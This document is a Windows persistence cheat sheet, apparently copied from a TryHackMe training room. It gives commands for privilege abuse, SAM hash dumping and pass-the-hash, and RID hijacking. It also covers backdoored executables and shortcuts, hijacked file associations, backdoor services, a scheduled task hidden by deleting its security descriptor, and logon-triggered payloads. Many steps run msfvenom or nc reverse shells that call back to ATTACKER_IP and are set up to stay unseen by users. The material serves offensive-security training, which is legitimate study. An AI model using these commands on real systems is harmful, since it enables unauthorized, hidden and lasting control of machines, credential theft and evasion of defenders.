# Windows Persistence



### Assign Group Memberships

* The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:

```
net localgroup administrators jack /add
```

* This will allow you to access the server by using RDP, WinRM or any other remote administration service available.
* Can also use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to **read/write any file or registry key** on the system, ignoring any configured DACL.

```
net localgroup "Backup Operators" jack /add
```

* Since this is an unprivileged account, it **cannot RDP or WinRM** back to the machine unless we **add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM)** groups. We'll use WinRM.

```
net localgroup "Remote Management Users" jack /add
```

* Check the groups and make sure they are not disabled

```
whoami /groups
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
```

* This is due to **User Account Control (UAC)**. One of the features implemented by UAC, `LocalAccountTokenFilterPolicy`, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session, if you are using WinRM, you are confined to a limited access token with no administrative privileges.
* Disable `LocalAccountTokenFilterPolicy` by changing the following registry key to 1:

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

### SAM SYSTEM Exfil / Pass The Hash

* We then proceed to make a backup of `SAM` and `SYSTEM` files and download them to our attacker machine:

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

* With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
--snip--
```

* And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

```
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

### Special Privileges and Security Descriptors

* A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership.
* Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself.
* Complete list of all privileges:
* [https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
* In the case of the Backup Operators group, it has the following two privileges assigned by default:
* `SeBackupPrivilege`: The user can read any file in the system, ignoring any DACL in place.
* `SeRestorePrivilege`: The user can write any file in the system, ignoring any DACL in place.
* We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```
secedit /export /cfg config.inf
```

* We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![](https://user-images.githubusercontent.com/75596877/180827452-97d0b2b3-cd89-459f-95ee-4d5276a41516.png)



* We finally convert the `.inf` file into a `.sdb` file which is then used to load the configuration back into the system:

```
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

* You should now have a user with equivalent privileges to any `Backup Operator`. The user still can't log into the system via WinRM, so let's do something about it.
* Instead of adding the user to the `Remote Management Users` group, we'll change the security descriptor associated with the WinRM service to allow `jack` to connect.
* Think of a security descriptor as an ACL but applied to other system facilities.
* To open the configuration window for WinRM's security descriptor, you can use the following command in **Powershell (you'll need to use the GUI session for this)**:

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

* This will open a window where you can add `jack` and assign it full privileges to connect to WinRM:

![](https://user-images.githubusercontent.com/75596877/180828110-e2645cd4-a708-4e8c-b4bf-186ab3d3749c.png)



* Notice that for this user to work with the given privileges fully, you'd have to change the `LocalAccountTokenFilterPolicy` registry key
* If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

```
net user jack
User name                    jack

Local Group Memberships      *Users
Global Group memberships     *None
```

### RID Hijacking

* When a user is created, an identifier called Relative ID (RID) is assigned to them.
* The `RID` is simply a numeric identifier representing the user across the system. When a user logs on, the `LSASS` process gets its `RID` from the `SAM` registry hive and creates an access token associated with that `RID`.
* If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
* In any Windows system, the default Administrator account is assigned the `RID = 500`, and regular users usually have `RID >= 1000`.

```
wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
--snip--
```

* Now we only have to assign the `RID=500` to `jack`. To do so, we need to access the `SAM` using `Regedit`. The `SAM` is restricted to the `SYSTEM` account only, so even the `Administrator` won't be able to edit it. To run `Regedit` as `SYSTEM`, we will use `psexec`.
* `PsExec64.exe -i -s regedit` From Regedit, we will go to:
* `HKLM\SAM\SAM\Domains\Account\Users\`
* We need to search for a key with its `RID` in hex `(1010 = 0x3F2)`. Under the corresponding key, there will be a value called `F`, which holds the user's effective `RID` at position `0x30`:

![](https://user-images.githubusercontent.com/75596877/180829367-5257c90e-37bc-4773-9ae2-d1a9bbb0fdc5.png)



* Notice the RID is stored using little-endian notation, so its bytes appear reversed.
* We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![](https://user-images.githubusercontent.com/75596877/180829481-acd6a81c-fb14-480b-92c8-aa41539dc9f3.png)



### Executable Files

* If you find any executable laying around the desktop, the chances are high that the user might use it frequently.
* Suppose we find a shortcut to `PuTTY` lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### Shortcut Files
- If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
- For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:
- ![7a7349b9dcc5af3180044ee1d7605967](https://user-images.githubusercontent.com/75596877/181036507-79d32d8d-2337-481f-b4c4-6766d6606f21.png)
- Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
````
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
````
- Finally, we'll change the shortcut to point to our script. 
- Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. 
- We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:
````
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
````
- ![fe703ddea6135e0c867afcc6f61a8cd2](https://user-images.githubusercontent.com/75596877/181037158-baa12732-f2d9-412f-aaa9-8ca74d3123b2.png)
- Let's start an nc listener to receive our reverse shell on our attacker's machine:
````
nc -lvp 4445
````
- If you double-click the shortcut, you should get a connection back to your attacker's machine. 
- Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. 
## Hijacking File Associations
- In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

- The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. 
- Let's say we want to check which program is used to open `.txt` files; we can just go and check for the `.txt` subkey and find which Programmatic ID (ProgID) is associated with it. 
- A ProgID is simply an identifier to a program installed on the system. For `.txt` files, we will have the following ProgID:
- ![3ae1b8356b38a349090e836026d6d480](https://user-images.githubusercontent.com/75596877/181037600-661af9c6-11f2-4b88-91b2-238a657efd50.png)
- We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling `.txt` files. 
- Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:
- ![c3565cf93de4990f41f41b25aed80571](https://user-images.githubusercontent.com/75596877/181037767-91b105ec-1938-4dec-a505-62147686dba3.png)
- In this case, when you try to open a `.txt` file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. - If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. 
- First, let's create a `ps1` script with the following content and save it to `C:\Windows\backdoor2.ps1`:
````
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
````
Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

- Now let's change the registry key to run our backdoor script in a hidden window:
- ![f7ed25a701cf20ea85cf333b20708ffe](https://user-images.githubusercontent.com/75596877/181038151-d8282131-c87d-4bde-881b-9e804ebd7daf.png)
- Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). 
- You should receive a reverse shell with the privileges of the user opening the file.
## Abusing Services
- Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

- A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

- There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### Creating backdoor services

- We can create and start a service named "RestartService" using the following commands:
````
sc.exe create RestartService binPath= "net user Administrator Passwd123" start= auto
sc.exe start RestartService
````
- **Note: There must be a space after each equal sign for the command to work.**
- The "`net user`" command will be executed when the service is started, **resetting the Administrator's password to `Passwd123`**. Notice how the service has been set to start automatically `(start= auto)`, so that it runs without requiring user interaction.

- Resetting a user's password works well enough, but we can also create a reverse shell with `msfvenom` and associate it with the created service. 
- Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. 
- If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
````
- You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:
````
sc.exe create RestartService2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start RestartService
````
- This should create a connection back to your attacker's machine.
## Modifying existing services
- While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. 
- We may want to reuse an existing service instead of creating one to avoid detection. 
- Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

- You can get a list of available services using the following command:
````
sc.exe query state=all

SERVICE_NAME: Test
DISPLAY_NAME: Test
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
````
- You should be able to find a stopped service called `Test`. To query the service's configuration, you can use the following command:
````
sc.exe qc Test
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Test
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\Test.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Test
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
````
- There are three things we care about when using a service for persistence:

- The executable (`BINARY_PATH_NAME`) should point to our payload.
- The service `START_TYPE` should be automatic so that the payload runs without user interaction.
- The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to `LocalSystem` to gain `SYSTEM` privileges.
- Let's start by creating a new reverse shell with msfvenom:
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
````
To reconfigure "`Test`" parameters, we can use the following command:
````
sc.exe config Test binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
````
You can then query the service's configuration again to check if all went as expected:
````
sc.exe qc Test
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Test
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
````
## Task Scheduler
- The most common way to schedule tasks is using the built-in Windows task scheduler.
- Let's create a task that runs a reverse shell every single hour.
````
schtasks /create /sc hourly /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "TaskBackdoor" has successfully been created.
````
- To check if our task was successfully created, we can use the following command:
````
schtasks /query /tn TaskBackdoor
Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
TaskBackdoor                         5/25/2022 8:08:00 AM   Ready
````
### Making Our Task Invisible
- Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. 
- To further hide our scheduled task, we can make it invisible to any user in the system by deleting its `Security Descriptor (SD)`. The security descriptor is simply an ACL that states which users have access to the scheduled task. 
- If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. - 
- Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

- The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "`SD`" contains the security descriptor. 
- **You can only erase the value if you hold `SYSTEM` privileges.**

- To hide our task, let's delete the `SD` value for the "`TaskBackdoor`" task we created before. To do so, we will use `psexec` to open Regedit with SYSTEM privileges:
````
c:\tools\pstools\PsExec64.exe -s -i regedit
````
- We will then delete the security descriptor for our task:
- ![9a6dad473b19be313e3069da0a2fc937](https://user-images.githubusercontent.com/75596877/181060133-34619dcd-33be-40f5-aa62-2fead6f2b4de.png)
- If we try to query our service again, the system will tell us there is no such task:
````
schtasks /query /tn TaskBackdoors
ERROR: The system cannot find the file specified.
````
## Logon Triggered Persistence
- Some actions performed by a user might also be bound to executing specific payloads for persistence. 
- Windows operating systems present several ways to link payloads with particular interactions.
### Startup folder
- Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in.
- If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
````
- We will then copy our payload into the victim machine. You can spawn an `http.server` with `Python3` and use `wget` on the victim machine to pull your file:
````
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
````
````
Powershell
wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.

Command Prompt
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
````
- Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):
## Run / RunOnce
- You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
````
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
````
- The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
````
- After transferring it to the victim machine, let's move it to C:\Windows\:
````
move revshell.exe C:\Windows
````
Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.
- ![c99038cd6cc9e37512edabb1f873a4da](https://user-images.githubusercontent.com/75596877/181061126-ae241ccd-7767-4401-9964-960d5ec878c3.png)
- After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
## Winlogon
- Another alternative to automatically start programs on logon is abusing `Winlogon`, the Windows component that loads your user profile right after authentication (amongst other things).

- `Winlogon` uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.
- ![f3c2215af6e3f2d19313498fca62a9d4](https://user-images.githubusercontent.com/75596877/181061468-d7eb9627-d9cd-4b9d-a9e0-355c4a9e81e4.png)
- If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. 
- Interestingly, you can append commands separated by a comma, and `Winlogon` will process them all.

- Let's start by creating a shell:
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
````
- We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:
````
move revshell.exe C:\Windows
````
- We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.
- ![dc5fa3e75ff056f11e16c03373799f45](https://user-images.githubusercontent.com/75596877/181061788-a42a814a-521c-4b04-a706-3dddc5008385.png)
- After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

## Logon scripts

- One of the things userinit.exe does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

- Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

- Let's first create a reverse shell to use for this technique:
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
````
- We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:
````
move revshell.exe C:\Windows
````
To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:








#### Credit:
All credit to the content of this page goes to the origional author

* [https://tryhackme.com/room/windowslocalpersistence](https://tryhackme.com/room/windowslocalpersistence)
* [https://tryhackme.com/p/munra](https://tryhackme.com/p/munra)
* [https://tryhackme.com/p/tryhackme](https://tryhackme.com/p/tryhackme)
